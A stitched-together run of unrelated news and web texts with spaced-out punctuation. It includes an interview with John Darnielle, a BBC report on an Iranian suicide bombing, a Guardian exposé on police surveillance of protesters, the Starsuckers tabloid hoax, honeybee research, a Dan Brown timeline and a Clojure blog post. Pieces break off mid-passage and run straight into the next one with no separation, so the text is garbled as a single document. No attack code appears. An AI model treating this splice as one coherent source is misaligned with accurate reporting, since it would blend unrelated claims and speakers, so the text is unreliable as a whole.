But on the forthcoming The Life of the World to Come , due October 6 from 4AD , he sinks his teeth into just about the biggest , heaviest subject imaginable : the Bible .
Every song on the album is named after a particular Bible verse , with the verses interacting with the songs in complex and fascinating ways .
Pitchfork spoke with Darnielle last week about what , exactly , this book and these verses mean to him .
Darnielle is one of indie rock 's great talkers , and he had a lot to say here .
Pitchfork : How 's it going ?
John Darnielle : I 'm doing pretty good .
Actually , I do n't know if you 're aware of this -- the album leaked today .
Pitchfork : I was not aware of that .
JD : Yeah .
A few years ago that would have been , [ gruff voice ] " Oh no . "
But I live in the real world .
It kind of takes a little pressure off when the album leaks .
Pitchfork :
So are they going to start selling it online early or anything ?
JD : No , no .
Any thoughts I have about that stuff are just clod - talk .
My stance on that stuff is that I have all sorts of weird ideas , and if I say something and somebody wants to run with it , that 's cool .
But I pretty much just focus on making the records -- unless I 'm self - releasing them , then I do my own thing .
But at some point , you have to stop worrying about chains of distribution or it takes out of your time to write .
Pitchfork :
Have you been getting a lot of texts about the album today ?
JD : Yeah . [ laughs ]
There 's a person in my chat list -- I do n't know who they are , they only appear by screen name , but the chorus to the second song of the album suddenly popped up as their status .
[ laughs ]
" Oh , well , I 'll be damned .
It must be out there . "
Pitchfork :
That 's one way to find out .
JD : It was pretty funny .
What 's funniest for me is to see the evolution .
I seriously used to be crestfallen when a leak would happen .
And I could still probably get into this frame of mind , but I used to really , really want people to experience the thing as a whole .
That 's what I used to enjoy so much : Bringing a record home , having it arrive in the mailbox .
Having the whole experience of hearing it as you 're holding it and looking at it and reading the liner notes , if they 're anything .
My liner notes are more sparse these days , but they 're still something I work on .
Instead of just raw data coming at you through the distraction of whatever else you 're looking at on the screen , and so on and so forth .
All that , at this point , is a romanticized past .
It 's real cool to have love for those experiences , but it 's kind of ridiculous to demand that everyone must experience what music was like for me as a child .
That would be dumb , to think that .
Pitchfork :
You wrote on your website that this record is about 12 hard lessons that the Bible taught you .
What do you mean by that ?
JD : The thing is , when you 're writing those sorts of things , you sort of labor over what you 're going to say .
I think any real one - sheet for an album would say , " Well , here 's what I 've been doing . "
And that would be it .
But there 's this sort of tradition of trying to frame it in such a way so that the person who reads it has something to grab a hold of , instead of just having to receive random pieces of information and order them themselves .
Because you want some sort of framework to know a little about it .
Gen Shooshtari was deputy commander of the ground force Several top commanders in Iran 's elite Revolutionary Guards have been killed in a suicide bombing in the volatile south - east of the country .
Iranian state television said 31 people died in the attack , in the Pishin region of Sistan - Baluchistan , and more than 25 were injured .
Shia and Sunni tribal leaders were also killed .
A Sunni resistance group , Jundullah , said they carried it out .
President Mahmoud Ahmadinejad said the criminals would be punished .
" The criminals will soon get the response for their anti-human crimes , " Irna quoted him as saying .
SISTAN - BALUCHISTAN ATTACKS
May 2009
A bomb explodes at a mosque in the provincial capital Zahedan , killing 19 and injuring 60 .
February 2007 Suspected militants killed 11 , including Iranian Revolutionary Guards , in a bomb attack in the provincial capital Zahedan .
March 2006
Gunmen posing as police kill 22 people , many government employees , after closing the Zabol - Zahedan road .
A top Guards officer has also vowed to deliver a " crushing " response to those behind the attack , according to Agence France Presse .
Sistan - Baluchistan is mainly made up of the Baluchi ethnic group , who belong to the Sunni Muslim minority of Shia- ruled Iran .
Jundallah has previously been accused by Iran of terrorist activities in the province .
Parliament Speaker Ali Larijani said " US action " contributed to the attack - an accusation dismissed by the US .
According to state media , one or more suicide bombers targeted the group of Revolutionary Guards leaders who had arranged to meet with tribal leaders .
One report said there were two bombs - one inside the meeting and one aimed at a convoy of guards just arriving .
' Terrorist ' attack ANALYSIS Jon Leyne , BBC Tehran correspondent Jundallah , or Army of God , has been involved in a long - running insurgency in Sistan - Baluchistan .
Some experts believe they may have ties with the Taliban or al - Qaeda , operating in Pakistan and Afghanistan .
That is disputed , and another possibility is that Jundallah maintains more informal links with ethnic Baluchis in the neighbouring countries .
Jundallah is also believed to have ties with drugs smugglers , who race across the border in heavily armed convoys , taking drugs on the lucrative smuggling route from Afghanistan through to Western Europe .
Diplomats on official visits to see progress in Iran 's war on the drugs trade are always heavily guarded .
In May Iran hanged several members for a major attack on a mosque in the provincial capital Zahedan .
The brother of the group 's leader , Abdolmalek Rigi , was due to be executed , but remains in prison for further questioning .
The deputy commander of the Guards ' ground force , General Noor Ali Shooshtari , and the Guards ' chief provincial commander , Rajab Ali Mohammadzadeh , were among at least six officers killed , state news agency reported .
Mr Larijani , speaking at an open session of parliament which was broadcast live on state radio , said : " We express our condolences for their martyrdom .
" The intention of the terrorists was definitely to disrupt security in Sistan - Baluchistan Province . "
" We consider the recent terrorist attack to be the result of US action .
This is a sign of America 's animosity against our country , " Mr Larijani said , quoted by AFP .
" Mr Obama has said he will extend his hand towards Iran , but with this terrorist action he has burned his hand , " he said , referring to US President Barack Obama .
The US condemned the attack , with a state department spokesman adding : " Reports of alleged US involvement are completely false . "
Earlier reports on Iranian TV quoted what it called " informed sources " as saying that Britain was directly involved .
A Foreign Office spokesman said : " The British government condemns the terrorist attack ... and the sad loss of life which it caused . "
The Iranian government has previously accused both countries of supporting the militants .
REVOLUTIONARY GUARDS
Officially the Islamic Revolution Guards Corps ( IRGC ) , or Pasdaran Formed after 1979 revolution Loyal to clerics and counter to regular military Estimated 125,000 troops Includes ground forces , navy , air force , intelligence and special forces Commander - in- chief : Mohammad Ali Jafari Iran President Ahmadinejad is a former member
Profile : Iran 's Revolutionary Guards Iran :
Who holds the power ?
Sistan - Baluchistan province , which borders both Pakistan and Afghanistan , has long been affected by smuggling , drug trafficking , banditry and kidnapping .
Jundallah , also known as the Popular Resistance Movement of Iran , says it is fighting against the political and religious oppression of the country 's Sunni minority .
In May , three men were executed for their role in a bombing of a mosque during evening prayers which killed at least 19 people in the south - east city of Zahedan in Sistan - Baluchistan .
The hangings came two days after the attack and the men were in custody on other charges at the time of the bombing .
Revolutionary Guards were among 11 people killed in an attack in 2007 in Zahedan .

Some scholars and writers use the terms " classical " and " classic " interchangeably when it comes to literature .
However , each term actually has a separate meaning .
The list of books that are considered classical versus classic books differs greatly .
What confuses things further is that classical books are also classic .
A work of classical literature refers only to ancient Greek and Roman works , while classics are great works of literature throughout the ages .
What Is Classical Literature ?
Classical literature refers to the great masterpieces of Greek , Roman , and other ancient civilizations .
The works of Homer , Ovid , and Sophocles are all examples of classical literature .
The term is n't just limited to novels .
It can also include epic , lyric , tragedy , comedy , pastoral , and other forms of writing .
The study of these texts was once considered to be a necessity for students of the humanities .
Ancient Greek and Roman authors were viewed to be of the highest quality .
The study of their work was once seen as the mark of elite education .
While these books generally still find their way into high school and college English classes , they are no longer commonly studied .
The expansion of literature has offered readers and academics more to choose from .
What Is Classic Literature ?
Classic literature is a term most readers are probably familiar with .
The term covers a much wider array of works than classical literature .
Older books that retain their popularity are almost always considered to be among the classics .
This means that the ancient Greek and Roman authors of classical literature fall into this category as well .
It 's not just age that makes a book a classic , however .
Books that have a timeless quality are considered to be in this category .
While determining if a book is well - written or not is a subjective endeavor , it is generally agreed that classics have high - quality prose .
What Makes a Book a Classic ?
While most people are referring to literary fiction when they refer to the classics , each genre and category of literature has its own classics .
For example , the average reader might not consider Steven King 's novel " The Shining , " the story of a haunted hotel , to be a classic , but those who study the horror genre may .
Even within genres or literary movements , books that are considered classic are those that are well - written and / or have cultural importance .
A book that may not have the best writing but was the first book in a genre to do something ground - breaking is a classic .
For example , the first romance novel that took place in a historic setting is culturally significant to the romance genre .
SAN FRANCISCO  Oh , Arnold .
In an apparent effort to infuse the dry work of government with a dash of manly brio , Gov. Arnold Schwarzenegger recently issued a veto statement that contained a message  and not a nice message  that some interpret as a put - down of the bill ’s author .
The message can be seen only by a careful reading of the printed version of the veto statement .
By taking the first letter of each line , beginning with the third line , two words emerge :
The first is obscene ; the second is “ you . ”
There is history here , of course .
The bill in question , which would have assisted financing for projects along the San Francisco waterfront , was sponsored by Assemblyman Tom Ammiano , a Democrat from the city who recently heckled the governor at a Democratic gala here after Mr. Schwarzenegger , a Republican , unexpectedly decided to speak at the event .
Mr. Ammiano , who is gay and was upset over cuts to state - financed AIDS programs , shouted at the governor , calling him a liar .
Mr. Ammiano also apparently shouted another  more vulgar  insult .
Police are gathering the personal details of thousands of activists who attend political meetings and protests , and storing their data on a network of nationwide intelligence databases .
The hidden apparatus has been constructed to monitor " domestic extremists " , the Guardian can reveal in the first of a three - day series into the policing of protests .
Detailed information about the political activities of campaigners is being stored on a number of overlapping IT systems , even if they have not committed a crime .
Senior officers say domestic extremism , a term coined by police that has no legal basis , can include activists suspected of minor public order offences such as peaceful direct action and civil disobedience .
Three national police units responsible for combating domestic extremism are run by the " terrorism and allied matters " committee of the Association of Chief Police Officers ( Acpo ) .
In total , it receives £ 9 m in public funding , from police forces and the Home Office , and employs a staff of 100 .
An investigation by the Guardian can reveal :
• The main unit , the National Public Order Intelligence Unit ( NPOIU ) , runs a central database which lists thousands of so - called domestic extremists .
It filters intelligence supplied by police forces across England and Wales , which routinely deploy surveillance teams at protests , rallies and public meetings .
The NPOIU contains detailed files on individual protesters who are searchable by name .
• Vehicles associated with protesters are being tracked via a nationwide system of automatic number plate recognition ( ANPR ) cameras .
One man , who has no criminal record , was stopped more than 25 times in less than three years after a " protest " marker was placed against his car after he attended a small protest against duck and pheasant shooting .
ANPR " interceptor teams " are being deployed on roads leading to protests to monitor attendance .
• Police surveillance units , known as Forward Intelligence Teams ( FIT ) and Evidence Gatherers , record footage and take photographs of campaigners as they enter and leave openly advertised public meetings .
These images are entered on force - wide databases so that police can chronicle the campaigners ' political activities .
The information is added to the central NPOIU .
• Surveillance officers are provided with " spotter cards " used to identify the faces of target individuals who police believe are at risk of becoming involved in domestic extremism .
Targets include high - profile activists regularly seen taking part in protests .
One spotter card , produced by the Met to monitor campaigners against an arms fair , includes a mugshot of the comedian Mark Thomas .
• NPOIU works in tandem with two other little - known Acpo branches , the National Extremism Tactical Coordination Unit ( Netcu ) , which advises thousands of companies on how to manage political campaigns , and the National Domestic Extremism Team , which pools intelligence gathered by investigations into protesters across the country .
Denis O'Connor , the chief inspector of constabulary , will next month release the findings of his national review of policing of protests .
He has already signalled he anticipates wide scale change .
His inspectors , who were asked to review tactics in the wake of the Metropolitan police 's controversial handling of the G20 protests , are considering a complete overhaul of the three Acpo units , which they have been told lack statutory accountability .
Acpo's national infrastructure for dealing with domestic extremism was set up with the backing of the Home Office in an attempt to combat animal rights activists who were committing serious crimes .
Senior officers concede the criminal activity associated with these groups has receded , but the units dealing with domestic extremism have expanded their remit to incorporate campaign groups across the political spectrum , including anti-war and environmental groups that have only ever engaged in peaceful direct action .
All three units divide their work into four categories of domestic extremism : animal rights campaigns ; far - right groups such as the English Defence League ; " extreme leftwing " protest groups , including anti-war campaigners ; and " environmental extremism " such as Climate Camp and Plane Stupid campaigns .
Anton Setchell , who is in overall command of Acpo's domestic extremism remit , said people who find themselves on the databases " should not worry at all " .
But he refused to disclose how many names were on the NPOIU 's national database , claiming it was " not easy " to count .
He estimated they had files on thousands of people .
As well as photographs , he said FIT surveillance officers noted down what he claimed was harmless information about people 's attendance at demonstrations and this information was fed into the national database .
He said he could understand that peaceful activists objected to being monitored at open meetings when they had done nothing wrong .
" What I would say where the police are doing that there would need to be the proper justifications , " he said .
Our hero , Cooper , awakes to find himself nauseous , weak and covered in webbing , hanging from the ceiling of an office where , just minutes ago , he started his new job .
As he struggles out of his slimy prison he comes face to face with his opponent - a grotesque , powerful and very angry bug .
All 3 ft of it .
And so begins a hideous , nail - biting , comedic , all - action adventure to find a safe haven while constantly outwitting an infestation of monstrous proportions .
As Cooper embarks on his journey , he befriends a ragtag group of survivors including Sara , a feisty determined female .
Will they make it to safety before they are picked off one by one ?
And what other surprises are in store for our group of unlikely heroes ?

It 's a small world :
The dazzling pictures of life under the microscope
These astonishing pictures reveal a stunning microscopic world - with beautiful images of algae , lobster eggs and soap film .
The close - ups give a glimpse into a universe that most have never seen , one that can usually only be experienced through the lens of a microscope .
They are all entries to the Nikon Small World competition , now in its 35th year , a contest that attracts entries from around the world .
Heiti Paves from Tallinn University won the competition with this 20X zoom picture of the anther from a thale cress plant .
The anther is on the end of the stamen and is where pollen is produced
Gerd A. Guenther , from Dusseldorf in Germany snapped this spiny sowthistle using a shop bought camera .
The flower is a common roadside weed in the U.S .
The stunning images come from the biological , industrial , and geological sciences and are produced from the most unlikely subjects , including aquatic larva and zebra fish .
Estonian Dr Heiti
Paves took top honours this year , with a mind - blowing image of a flowering plant anther taking first place on October 8 .
He said : ' As part of my work as a research scientist , I have been taking photographs through the microscope for almost 30 years to observe the processes in living cells .
' I am honoured to receive this recognition and I 'm excited for the opportunity to share my work broadly . '
Honourable mentions :
These futuristic images have far more mundane origins .
On the left is a finch 's testicle and on the right is a fungal infection on a flowering plant root
What on Earth is it ?
This hexagonal shaped object is a snowflake .
It achieved 19th place .
This colourful spiral is part of an Anglerfish ovary .
The deep sea fish uses a light to attract prey
Judges assess images based on both scientific and artistic qualities , with the leading images displaying strengths in both areas .
Their impact , technical proficiency , originality , and contribution to scientific community are also looked at to evaluate entries .
Not all those who submitted photographs come from the world of science , anyone with a microscope can take part .
Although standard instruments are enough , many of the images were taken with highly specialized microscopes that can cost hundreds of thousands of pounds .
But even the simplest of microscopes can result in impressive photos .
Gerd Guenther from Germany scooped second place with a 150X zoom image of a thistle taken using a shop - bought device .
The pictures will now be featured in a touring exhibit around the U.S .
These orange orbs are actually a close - up of algae .
Pictured by Dr Arlene Wechezak the image was awarded 10th place

On the heels of breaking up an alleged bomb terror plot , New York is planning to place high - tech security cameras , license plate readers , and “ weapons sensors ” in midtown Manhattan .
Office workers and tourists – and possible terrorists – will have cameras watching their every move as they visit Macy ’s , shop for diamonds at Tiffany & Co. , or gawk in Times Square .
The apparatus , paid for by some $ 24 million in Department of Homeland Security funding , will expand a similar effort already underway in lower Manhattan where cameras focus on the Federal Reserve , the New York Stock Exchange , and the Brooklyn Bridge .
Mayor Michael Bloomberg , announcing the program Sunday , said the goal is to detect terrorism threats and deter pre-operational surveillance .
Sensors will try to detect chemical , biological , and radiological threats .
But some terrorism experts have questioned whether a camera network will deter terrorists .
They also say that sensors are known to give off “ false positives . ”

TPM Reader FC pleads , “ Stop the madness ! ” :
You ’re part of the problem .
I do n’t expect much from Politico or AP because they ’re shills for the Republican Party .
But I hold TPM to a higher standard .
You ’re getting your readers worked up about some anonymous sources and Axelrod ’s language ( I ca n’t believe you ’re deconstructing the word “ spirit ” ) in order to start the whole hyperventilating - of - progressives cycle again .
It ’s like the movie Ground Hog Day : someone writes an article with tons of anonymous sources about how the Administration is abandoning the public option .
The progressive blogosphere goes crazy for the next 48 hours .
The Administration comes out with a statement saying nothing has changed , and they would prefer a public option .
The progressive blogosphere calms down and finds some other shiny object to fixate on .
Then someone writes another article with tons of anonymous sources about how the Administration is abandoning the public option , and we start the whole process over again .
It ’s exhausting , and you ’re not helping !
Not just FC .
TPM Reader JF , too :
I have to say I am disappointed with your political radar on the public option issue today .
Every time someone says the President does n’t care about the public option he stands up in front of an audience and explains that he is for it and more cogently than anyone else out there explains how it would work and why he thinks it is a good idea .
It ’s also true that he usually points out that the public option is merely a part of a larger reform , the other parts of which are extremely important and critical to expanding coverage and controlling costs .
As a matter pf policy he is of course correct .
[ As an aside I am disappointed that intelligent people like you seem to ignore the fact that there are many things that work to control costs that do not depend on the public option at all .
They do n’t even depend on who is paying –but how we pay and for what .
The 50 % of health care that is already paid for by the government has a serious cost control problem , too . ]
Politically , the problem for Obama is how to make the public option politically palatable to members of his own party , and also to the public who are suspicious of change ( and no the public answering the polls have no idea what the “ public option ” really means ) .
Drawing a line in the sand and insisting on the most rigid form of the public option is about the stupidest way to do it .
Turning health care reform into a referendum on the “ public option ” is as stupid politically as turning Social Security reform into a referendum on privatization .
The only people who want that are the far right and the far left .
What he is going to do is give the hold - outs in his party versions of the public option that they can sell to their constituents .
He ’ll say the exchange will include a non -profit self - funded plan run by a government chartered corporation that will be administered by private contractors ( like Medicare , by the way ) .
Or he say we ’ll have a public plan and co-ops and consumers can choose .
He may propose a public option that only goes into place if for example health care premiums in a specific market rise by more than consumer inflation more than two years in a row or by more than X % in any one year .
( If you study the experience of the State of Wisconsin with value based purchasing you will find out that the threat of starting a public plan in counties that had little or no competition among insurers was usually enough to get the insurers back in line ) .
Anyway there are many versions .
To suggest that this in any way compromises the objective of a guaranteed life - time access for everyone o high quality care that is affordable individually and collectively is nonsense .
Chris Atkins , director of Starsuckers , on fooling the tabloids guardian .co.uk
The plan to subvert the pages of some of Fleet Street 's bestselling newspapers was hatched in a windowless office in east London .
For months , a team of documentary makers had sat in the Brick Lane film studio they called " the cell " , trawling through tabloid clippings in search of stories they could prove were untrue .
They decided to concoct an experiment to test their theory that tabloid editors sometimes publish celebrity stories with scant regard for the truth .
" We consumed a lot of coffee thinking about it , " said Chris Atkins , the director of the forthcoming film Starsuckers .
" How can we do this intelligently ?
How can we prove our point ?
But how can we make it funny ? "
Atkins and his producers decided the answer was to pose as members of the public and offer completely fictitious stories to the tabloid press about well - known figures .
Their first call , on 18 March , concerned a fictional sighting of the Canadian singer Avril Lavigne asleep at the nightclub Bungalow 8 .
The story appeared in the following day 's Daily Mirror under the headline : " Avril Lavigne a lightweight at London clubbing " .
" After knocking back cocktails , the singer was found slumped across her table , snoring , " the story noted .
" Lightweight ! "
Within a fortnight , almost every daily tabloid newspaper in the UK had published one of the Starsuckers team 's bogus stories about the likes of Amy Winehouse , Pixie Geldof and Guy Ritchie .
At times , the fake stories were reproduced by media outlets across the world , where they were presented to millions of readers as fact .
The Lavigne story was not run in the Daily Express , the Sun or the Daily Star , all of which had been called about it by the documentary team .
But over the next fortnight , all four newspapers would be duped into publishing fabricated stories .
Starsuckers presents the experiment with fake stories as evidence that media organisations cannot be trusted to tell the truth .
That claim is likely to be contested by the newspaper industry when the film officially previews at the London film festival later this month .
The editors the documentary team targeted may complain they were victims of the same kind of skulduggery the director will be claiming is rife in their newsrooms .
Atkins defended the ethics of his project , which he said was guided by a strict set of moral and legal ground rules .
He received no money for the fabricated news , for example , although he claims to have received promises of up to £ 600 payments .
His team researched the whereabouts of celebrities to ensure their invented stories had some credibility .
But they said they were careful not to fabricate evidence to support their claims , or offer any corroboration .
They argue that the fabricated snippets of gossip were improbable enough to ensure tabloid editors had ample reason to check their veracity by calling the celebrity or their agent .
Using aliases such as " Gigi " and " Neve O'Looney " that , Atkins claims , should have rung alarm bells , the filmmakers called the " Got a story ? " telephone numbers advertised in newspapers .
After one such call , the Daily Express ran a diary story about the comedian Russell Brand at the G20 protests in London .
Quoting fabricated remarks from the Starsuckers caller on 3 April , the paper said Brand had " sheepishly confessed that when he was a little boy he once wanted to be a banker when he grew up and even had a toy Fisher - Price cash register " .
The following day , a fabricated story appeared in the Mirror 's gossip column about Pixie Geldof , the socialite daughter of Bob Geldof .
Paraphrasing the hoax Starsuckers caller , the newspaper stated : " We 're told : ' Pixie joked she did n't know why her boobs had got bigger , then she pulled out a pick ' n ' mix pack from her bra . '
Sweet . "
Atkins said he was most surprised to see the speed with which fabricated stories reappeared in other media outlets , apparently with no attempt at corroboration .
A story about singer Amy Winehouse 's hair catching fire from a faulty fuse spread across the world after it was printed in the Mirror on 21 March under the headline " Amy Winehouse in hair fire drama " .
The Starsuckers researcher gave the newspaper fictional details of the story , which she said she had " heard " from an unnamed friend who was at the singer 's house .
" Fuses blew as Wino jammed with mates at the house in north London – and sparks lit up her beehive , " the Mirror reported .
" We always knew you were a hothead , Amy . "
Two days later , the same story appeared in the Daily Star , which had also received a Starsuckers call , with an embellishment about how a friend of the singer " ended up punching flamey Amy 's head to put out the blaze " .
It reappeared on several celebrity gossip websites , a New York Post blog and , eventually , the pages of the Times of India – the widest - circulation English - language newspaper in the world .
Similarly , a fabricated story about the film director Guy Ritchie receiving a black eye after " juggling clumsily with cutlery after one drink too many while dining with pals at Mayfair restaurant Scotts " was published in the Sun on 24 March and , days later , recycled in the Scunthorpe Telegraph .
Atkins said the team 's greatest success was a fictional account about Sarah Harding , of the pop group Girls Aloud , published in the Sun 's flagship gossip section , Bizzare , on 2 April .
A Starsuckers researcher called the Sun pretending to be " Karys " , the wife of a removal man who had recently helped the singer move home .
The reporter was told Harding owned a number of books on quantum physics and a telescope .
" Maybe she 's really into astronomy or something , I dunno , " she said .
The Sun 's story , headlined " Sarah 's a real boffin " , claimed Harding was a " secret stargazer " who reads " mind - boggling books about astronomy and quantum physics " .
It also contained a quote from " a source " , which , the Atkins team insists , did not come from them .
" There 's a lot more going on under that blonde barnet than Sarah 's given credit for , " the Sun 's source said .
" She 's a smart cookie and does read an awful lot . "
Within hours , news of Harding 's apparent penchant for astronomy had spread across the internet , from the online site of Cosmopolitan magazine to Ankara , where the news was reported in Turkish Weekly .
Atkins said that not all the hoax stories succeeded , and that , on several occasions , invented snippets of gossip appeared in some newspapers but not others .
One , a far - fetched account about a plan by anticapitalist protesters to dump a tonne of sugar outside the private residence of Lord Alan Sugar , the millionaire businessman and presenter of the BBC show The Apprentice , was never printed , despite calls to the Daily Mail , Mirror and Sun .
The Daily Star , Daily Express , Daily Mirror and Sun declined the opportunity to comment on their publication of hoax stories .
Atkins defended his project , saying the onus was on the newspaper to corroborate what it publishes .
" Had those fake stories been fact - checked by the newspapers before they were printed , they would have realised – I think within minutes – that they were about to publish complete and utter babble . "
Honeybees can communicate with others from far - off continents by learning to interpret their dance moves , scientists have found .
The world 's nine species of honeybee separated about 30 m years ago and have since developed their own diverse dances , which are used like languages .
One of the most important moves is the waggle dance , which foraging honeybees use to tell workers back at the nest how far away and in which direction they will find a new source of nectar .
In the dance , bees shake rapidly from side to side as they move forward , before looping around and starting again .
As the bees perform , they warm up and release chemicals that are thought to cause nearby worker bees to pay attention and then follow the directions encoded in the moves .
A team of researchers from Australia , Germany and China decided to investigate whether bees from different continents could understand one another .
To do so , they established a hive of the two most geographically distant honeybee species , the European and Asian honeybee .
Using high - speed video footage of the bees in their natural environment , the scientists were able to spot how the dances differed .
Both used the same tactic to indicate direction .
If bees of either species danced while pointing their head upwards , it meant fly towards the sun .
Pointing downwards meant fly away from the sun .
By changing their position relative to gravity , they could direct worker bees to fly in any direction necessary .
But the honeybees differed in how they danced out distance .
In both species , longer dances indicated that food was further away , but Asian bees danced much longer to indicate the same distance .
To European honeybees , a 1.5 second dance meant the food was 600 metres away , while Asian bees understood this to mean 400 metres .
In an experiment set up along the banks of the Da-Mei canal in Fujian province , China , the scientists trained European honeybees from the hive to visit one of six feeding stations , which contained dishes of sugary liquid .
The stations were set at 400 , 500 and 600 metres in front of and behind the hive .
The bees then returned to the hive and danced out directions so worker bees could find where to feed .
Video footage showed that when the foragers returned and began dancing , other bees watched and later left the hive in search of the food .
" At first , the Asian bees did not turn up , but later they found the right feeder , " said Jürgen Tautz , a co-worker on the study and head of the bee group at the University of Würzburg in Germany .
The research is published in the journal PLoS One .
The team then trained the European bees to visit a different feeding station and again let them return to the hive to dance out its location .
" The second time around , the Asian bees turned up immediately .
They had learned that the distance was different in these dances and recalibrated how far they had to fly . "
The finding is the first to suggest that honeybees can learn to understand the dialects of other bee species .
" We believe that this is an important breakthrough in the study of honeybees , and that such mixed - species hives will open exciting new avenues of research into various aspects of this social insect 's biology , " the team wrote .
The scientists are conducting experiments to see if European honeybees are just as able to learn the dances of Asian honeybees .
The importance of bee dances was first noted by the Austrian zoologist Karl von Frisch , who was awarded the Nobel prize for medicine in 1973 .
Before he revealed himself to be a cultural phenomenon on par with the Beatles , Brown had other ambitions , like being Barry Manilow .
1 ) What Child Is This ?
Dan Brown is born in 1964 , to a math teacher at Phillips Exeter Academy and a church organist .
A choirboy , he begins high school in 1978 on the campus where he was raised .
He receives a C– on his first English paper ( about the Grand Canyon ) .
Teacher ’s advice : “ Simpler is better . ”

2 ) Blood Line : A nonfiction book called Holy Blood , Holy Grail is published in 1982 , just as Brown begins college at Amherst .
Its authors put forth the hypothesis that Jesus Christ married Mary Magdalene , and that their descendants founded the Merovingian dynasty in France .
Scholars scoff , but critic - novelist Anthony Burgess writes , “ I can only see this as a marvellous theme for a novel . ”
3 ) Prodigal Son : After Amherst , Brown strikes out for L.A and releases a self - titled CD with such songs as “ 976 - Love . ”
Some compare him to Barry Manilow .
In 1993 , he returns to Exeter to teach English , abandoning his music career but bringing his manager and future wife .
She helps him publish a book , under the pseudonym Danielle Brown : 187 Men to Avoid : A Survival Guide for the Romantically Frustrated Woman .
4 ) Immaculate Conception :
On vacation in 1993 , Brown reads Sidney Sheldon ’s The Doomsday Conspiracy and decides he can do as well .
But he needs a hook .
He ’ll later claim that , in 1995 , the Secret Service raided Exeter , investigating a student who e-mailed that Bill Clinton “ should be shot . ”
Brown writes a techno - thriller called Digital Fortress , and quits teaching in 1996 .
5 ) The Wilderness : St. Martin ’s Press publishes Digital Fortress in 1998 .
Kirkus calls it “ inordinately complicated but reasonably exciting . ”
The book sells only a few thousand copies , but Brown gets press for bringing to light a perceived threat to e-mail security .
Cliffhangers and controversy : The Dan Brown formula is born .
6 ) The Good Samaritan : Pocket Books buys Brown ’s next two books : Angels & Demons , starring geeky - dashing Harvard symbologist Robert Langdon , and a “ palate cleanser ” called Deception Point .
But his editor leaves , stranding Brown — until Jason Kaufman arrives to take over Angels & Demons .
Both books sell dismally , but Kaufman is excited by Brown ’s next project , which continues the symbologist ’s saga , yet uses the same premise as Holy Blood , Holy Grail .
In fact , when Kaufman leaves Pocket for Doubleday , he insists that Brown be allowed to come with him .

7 ) The Word : Doubleday publisher Stephen Rubin not only agrees but , after reading a 60 - page proposal , ponies up $ 400,000 for Brown ’s next two books .
It ’s a gamble — they all breathe easier , though , when Janet Maslin writes in her Times review that “ the word for The Da Vinci Code … is wow . ”

8 ) The Money - Changers : The Code explodes , staying on the Times best - seller list for 136 weeks .
Foreign rights sell in a frenzy that will last through 2008 , with the licensing of a Uighur - language edition .
Under Rubin , Doubleday blows up , too , spending blockbuster money left and right .
Brown ’s follow - up — another Langdon book — is scheduled for 2005 .
9 ) Cardinal Sins ?
But the Code phenomenon proves hard to control .
The Vatican even appoints a cardinal to rebut the book ’s assertions .
Two plagiarism cases consume Brown ( including one from the writers of Holy Blood ) , though he wins both .
The publication of his next book ( tentatively titled The Solomon Key ) is pushed back .
Photo : Columbia / Everett Collection
10 ) The Deposition : The Da Vinci movie , starring Tom Hanks , has a good opening weekend in 2006 .
Angels & Demons , the prequel , is released in 2009 to less - impressive effect .
Still , total worldwide grosses for the two exceed $ 1 billion .
But where ’s The Solomon Key ?
Even as lawsuits publicize details of Brown ’s writing habits ( waking at four and breaking for calisthenics every hour ) , the writer himself retreats .
11 ) Revelation : Finally , in January 2008 , following a flurry of “ Where ’s Dan Brown ? ” coverage , Rubin says a date is set for the book , but remains cryptic : “ Dan Brown has a very specific release date for the publication of his new book , ” he tells The Wall Street Journal , “ and when the book is published , his readers will see why . ”
12 ) Resurrection ?
In October 2008 , Doubleday sheds 10 percent of its workforce ; reps deny that Dan Brown ’s delay was a factor .
A month later , the imprint is merged with Knopf , with Rubin later given the post of “ publisher at large . ”
The following April , they announce a release date ( September 15 ) and title ( The Lost Symbol ) .
Two weeks from pub date , Amazon announces on its front page that its “ stockpile ” is “ under 24 - hour guard . ”
New evidence of the efficacy and lack of side - effects of marijuana in the treatment of several diseases .
On the treatment of chronic pain :
“ Cannabinoids may augment the analgesic effects of opioids , allowing longer treatment at lower doses with fewer side effects . ”
This is an empirical and scientific question , not a social or moral one .
And what many do not seem to understand is that marijuana is often most effective in enabling patients to tolerate medication regimens that would otherwise be impossible to maintain : chemotherapy , multiple sclerosis meds , AIDS therapy , etc .
And yet it is still close to impossible to do real research on it ... because it may give people pleasure .
One day , people are going to look back on this small period of prohibition and wonder what on earth were people thinking of .
( By the way , Fortune 's recent cover - story on the de facto legalization of pot in California is one of the most thorough and informative I 've read .
Yes , it 's the cover of Fortune .
The times they are a -changing . )
We want to hear what you think about this article .
Submit a letter to the editor or write to letters@theatlantic.com .
This is perhaps a slight digression ; just an extended expression of pleasure about Clojure ’s recur statement .
It neatly squashes a bee I ’ve had in my bonnet for some years now ; if it ’s wrong to loathe “ tail recursion optimization ” then I do n’t want to be right .
Terminology · I acknowledge that recur is n’t a “ statement ” , it ’s actually a “ special form ” which is what languages that do n’t want to admit having syntax call their keywords .
But hey , it ’s a built - in fixed - syntax thingie that usually stands on its own line and causes transfer of control to another place in the program , so for my money it walks like a statement and works like a statement .
Recur Details ·
There ’s nothing to it , really .
If you ’re in a function and you say ( recur arg arg ... ) — the number of arguments has to be the same as the function takes — you restart the function with the new set of arguments from the recur .
It ’s a highly controlled and structured GOTO .
This walks like a loop and smells like a loop , and so , sensibly enough , there ’s another statement oops special form called loop :
( def factorial ( fn [ n ] ( loop [ cnt n acc 1 ] ( if ( zero? cnt ) acc ( recur ( dec cnt ) ( * acc cnt ) ) ) ) ) )
( Gosh , I ca n’t help but noticing how , in Erlang , you see tons of functions which exist only to do tail - recursive looping and have names like looper or whatever_loop .
Nudge nudge , wink wink . )
recur is simple , it ’s easy to understand , it does n’t burn stack space , and the function or loop arguments are still immutable in the context of any single pass through .
Also I find the name “ recur ” to be an example of engineering elegance ; obviously correct , once you think of it .
I ’m amused by the write - ups in the Clojure literature ; they all take the form of “ Since Clojure is based on Java , and the JVM does n’t do tail - call optimization ( how sad ) we were forced to provide this recur thingie .
Sorry ’bout that , and if Java gets its act together , we ’ll do tail calls right . ”
But it seems obvious to me that recur is better than tail - call - optimized recursion .
Why I Hate Tail Call Recursion Optimization ·
It feels like a big fat lie .
It looks like a subroutine call , but in the case where it occurs as the last thing in the routine , it magically , silently , and automatically gets turned into , now how did I put it ?
“ A highly controlled and structured GOTO . ”
If that ’s what the programmer wants , then that ’s what the programmer should bloody well ask for .
